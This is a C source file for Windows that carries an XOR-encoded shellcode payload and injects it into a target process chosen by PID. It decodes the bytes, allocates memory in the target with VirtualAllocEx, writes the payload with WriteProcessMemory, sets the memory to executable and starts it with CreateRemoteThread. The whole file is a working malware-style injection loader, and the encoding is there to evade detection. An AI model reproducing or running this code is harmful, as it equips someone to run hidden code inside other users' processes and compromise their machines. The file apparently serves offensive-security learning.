#include <windows.h>
#include <stdio.h>
#include "../utils/utility.h"

UCHAR const key[] = "shellcodefacile";
UCHAR const code[] = "\x8f\x20\xe6\x88\x9c\x8b\xaf\x64\x65\x66\x20\x32\x28\x3c\x37\x22"
"\x3e\x2d\x5d\xbe\x06\x27\xef\x37\x06\x29\xe8\x3b\x74\x2d\xf8\x3a\x45\x24\xe7\x11\x3f"
"\x2c\x6a\xd1\x2b\x29\x24\x5d\xac\x3b\x59\xa5\xc0\x50\x02\x13\x66\x49\x46\x20\xa2\xa0"
"\x61\x24\x72\xa9\x87\x81\x3e\x22\x3e\x2c\xee\x34\x41\xe8\x2b\x50\x2d\x72\xb8\xee\xec"
"\xe4\x63\x6f\x64\x2d\xe3\xa1\x17\x0e\x24\x64\xa3\x38\xee\x24\x74\x27\xe4\x24\x45\x2f"
"\x60\xb3\x8a\x3a\x2d\x8c\xa1\x24\xe7\x58\xeb\x27\x65\xb3\x2b\x50\xaa\x21\x5d\xa5\xdf"
"\x29\xa4\xa5\x61\x22\x6e\xa5\x5d\x86\x14\x92\x25\x6f\x29\x57\x60\x20\x55\xbd\x16\xb7"
"\x3c\x21\xed\x21\x47\x20\x6d\xb5\x15\x29\xee\x60\x24\x27\xe4\x24\x79\x2f\x60\xb3\x28"
"\xe7\x61\xfb\x20\x64\xbc\x2d\x3b\x2e\x3c\x3b\x3f\x3b\x22\x31\x2d\x3c\x32\x32\x2d\xef"
"\x80\x43\x2e\x36\x9a\x86\x39\x22\x30\x36\x2d\xf8\x7a\x8c\x3b\x93\x9c\x90\x39\x2d\xdc"
"\x60\x63\x69\x6c\x65\x73\x68\x65\x24\xe1\xee\x6e\x65\x65\x66\x20\xd9\x58\xe7\x0a\xf4"
"\x97\xb0\xd7\x8c\x7e\x45\x6e\x24\xdc\xc7\xf6\xd4\xf1\x9a\xa6\x20\xe6\xa8\x44\x5f\x69"
"\x18\x6f\xe6\x9a\x83\x1c\x69\xde\x34\x7b\x17\x03\x06\x63\x36\x25\xec\xbc\x9e\xb6\x0a"
"\x01\x01\x5d\x0d\x1d\x09\x4c\x4c\x2c\x44\x06\x07\x0d\x00\x47\x09\x1d\x16\x68";


int main(int argc, char const *argv[])
{
    DWORD   oldProtection;
    DWORD   pid;
    LPVOID  remoteAddr;
    HANDLE  processHandle;
    HANDLE  threadHandle;
    DWORD   lpflOldProtect;
    SIZE_T  codeSize    = sizeof(code);
    SIZE_T  keySize     = sizeof(key);
    SIZE_T  decodedSize = codeSize - 1;
    UCHAR   decoded[decodedSize];
    
    if (argc < 2){
        MESSAGE(INFO, "Usage %s <pid>\n", argv[0]);
        return EXIT_SUCCESS;
    }

    pid = atoi(argv[1]);

    MESSAGE(INFO, "Code address: 0x%p, size: %ld bytes with \\0\n", code, codeSize);
    MESSAGE(INFO, "Key address: 0x%p, size: %ld bytes with \\0\n", key, keySize);
    MESSAGE(INFO, "Decoded address: 0x%p\n", decoded);
    MESSAGE(INFO, "Decoding...\n");
    // Decoding ...
    for (int i=0; i < codeSize - 1; i++){
        decoded[i] = (UCHAR) code[i] ^ key[i % (keySize - 1)];
    }
    MESSAGE(OKAY, "Decoding done!\n");

    MESSAGE(INFO, "Trying to open remote process with (%ld)\n", pid);
    // Open handle to the process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (processHandle == NULL){
        MESSAGE(FAIL, "Impossible to get handle of the process(%ld)\n", pid);
        PRINT_ERROR(OpenProcess);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Handle got for process(%ld)\n", pid);

    // Allocate bytes to process memory
    remoteAddr = VirtualAllocEx(processHandle, NULL, decodedSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (remoteAddr == NULL){
        MESSAGE(FAIL, "Impossible to allocate %ld bytes of memory in process(%ld)\n", decodedSize, pid);
        PRINT_ERROR(VirtualAllocEx);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "%ld bytes of memory successfully allocate in process(%ld)\n", decodedSize, pid);

    // Write bytes(shellcode) to process allocated memory
    if (WriteProcessMemory(processHandle, remoteAddr, (LPCVOID)decoded, decodedSize, NULL) == 0){
        MESSAGE(FAIL, "Impossible to write shellcode to process(%ld)\n", pid);
        PRINT_ERROR(WriteProcessMemory);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of process(%ld)\n", decodedSize, pid);

    // Change the proetction of allocated memory to EXECUTE and READ
    if (VirtualProtectEx(processHandle, remoteAddr, decodedSize, PAGE_EXECUTE_READWRITE, &lpflOldProtect) == 0){
        MESSAGE(FAIL, "Impossible to change the protection of the allocated space in process(%ld)\n", pid);
        PRINT_ERROR(WriteProcessMemory);
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Permission successfully changed to ERW at 0x%p\n", pid, remoteAddr);

    MESSAGE(INFO, "Press <enter> to run the code...\n");
    getchar();
    // Create thread to run the code remotly
    threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteAddr, NULL, 0, NULL);
    if ( threadHandle == NULL){
        MESSAGE(FAIL, "Impossible to create thread in process(0x%p): Error %ld\n", processHandle, GetLastError());
        return EXIT_FAILURE;
    }
    MESSAGE(OKAY, "Successfully create thread to run the code in process(%ld)\n", pid);

    MESSAGE(OKAY, "Waiting for thread to finish executing...\n");
    WaitForSingleObject(threadHandle, INFINITE);
    
    MESSAGE(OKAY,"Thread finished executing, cleaning up\n");
    CloseHandle(threadHandle);
    CloseHandle(processHandle);

    return EXIT_SUCCESS;
}
